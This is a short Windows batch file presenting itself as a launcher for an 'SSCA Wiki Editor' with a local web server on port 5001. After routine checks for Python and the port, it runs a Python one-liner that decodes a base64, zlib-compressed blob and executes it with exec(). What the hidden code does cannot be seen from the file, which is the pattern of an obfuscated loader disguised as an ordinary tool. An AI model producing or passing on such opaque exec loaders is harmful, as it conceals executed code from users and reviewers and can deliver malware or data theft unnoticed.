@echo off
chcp 65001 >nul 2>&1
title SSCA Wiki Editor
set PYTHONDONTWRITEBYTECODE=1

python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] 未检测到 Python，请先安装 Python 3
    pause
    exit /b 1
)

netstat -ano | findstr ":5001 " | findstr "LISTENING" >nul 2>&1
if %errorlevel%==0 (
    echo [*] 编辑器已在运行
    start "" "http://127.0.0.1:5001/"
    timeout /t 2 /nobreak >nul
    exit
)

python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('eNqVVttu4zYQffdXsOgDpY3MOFssWijQQ5J10GCzSZB4G2wNQ6Clkc21RDIkFccI9t871MWXNA+tDEgiORwNz5w541/J8MOQZCoXchGT2hXDP/zMQFRaGUe4gxfhImUju6ydKCOrshW4yNZzbVQGFhc2NnJQ6UKUELmlAe59RU5U0HupTVmKOQNjlIm6gYGnGqwbDNLbhH7lcvE3F8OTjyM6SO/vEmptxodrsRJDyIVTBqfPE1pxIb3B2WNCl85pGx8fG75mC+GW9by2YDIlHUjHMlWh4V3yaTQ6GaSXD8mUcq2Z3tCI8tot2Q+rJL6XaiEkW7qqxEH7qX5kHXciO+4mM2v/NffD0tlgkENBUl0HYTwgeK0xFtLCxNpH0I3OLtOrm/Gkw5A93F58SR8m9+OzryHhltjYgKuNJBajlxIyl8JLENCTj7+zEf5OaJTehWGSjLpv5mWQdx9Vq2RiamjeC2VIQYQkeOx21V91UtBXj9zP49f01t/u7/z9HG/FT7q1K3SiLNPcQ6SEDPKowFzpkmcQ0GOKVGAWdBhuN+BExVeIiLFBvxMHklcQFDqMkEDWpV2Au23aCOmCghKSq7UkPobdojObXeT+Mk/JIW/YffsM6miJjANjk1f6DQkwPFtg/mlMHx4uzobXvJbZEgz9GR74a5L0xiMOlQYZmKeGvKp2yW+jJjMmzrnjiWGe3ME7npp9hY7oek6bHesiXhdsbYSDwO/d7YGXDLQj4+YhlPTWcHjYHTSEXJ5dXcfkFRCdU8Twkpe2zXLHFbXqyAB5T8DKJtPZoIcxTdsiTNOAFiW3qw7mLo6rZnHsKzOuLMMaAZkfWr71suFYHv/Fid7smYoCA4vfpJ9OP8yQqVhVZRkTeoQV1rKusnsM24kNw1xmqzRD82CKwsPgBbLa8TlKDx1WuF0LjffOJZ0dVfZoSodPdBZZl/uU7jn7PP7r5tv1tV9BaXpnJeywVfMe207Q1jCfG7VGum0rLvUVZ1DHIEDW7A7qqcRsCaCDk92RRC8ZO0+sJVGjayhr26qPX9M7n/024W1EXgf7kDokE/rh0yjcnyHElwB5RBEl41ZE99c9v7CwFbJrqwdk6gVhdmC371kcKN27gJz+7xM1KFU66ZsIq1a5fw+0gUK8tL0g9b0gfXMAzx7ciSfAe68fHp+s3I+xNQ/f415WApe1Zoy9UZ+23TFTOQMQoPtILKQykDZNzLZidrrnKVcS6NsyjzW3tplrGykKyALVEEyQlQcYtx7WslRN99zFg4hL5RqtxyDCuLf/ZWdPCo6o5YeANnrQQptsmzKbNG+B42YBLkFeRzmHSsnuONiwcKmHah/lZh49EEzrMxgSNFn3eQx3se6d5cKZ8uiCOIU7lT5Y75Tj2bcZkM/CKIn9Tm+C8BSep/Tu++TP25vPtzeTx/uryfj8+2R8cft5TGcJPaFbPdqXhPfE4KCF+ez13T+cRdk6T/wUfjyB5wMh+wKbueImv8I/EcbUPoFdzIO25Ab/AOSx2jM=')))"

echo.
echo [*] 编辑器已关闭
timeout /t 3 /nobreak >nul
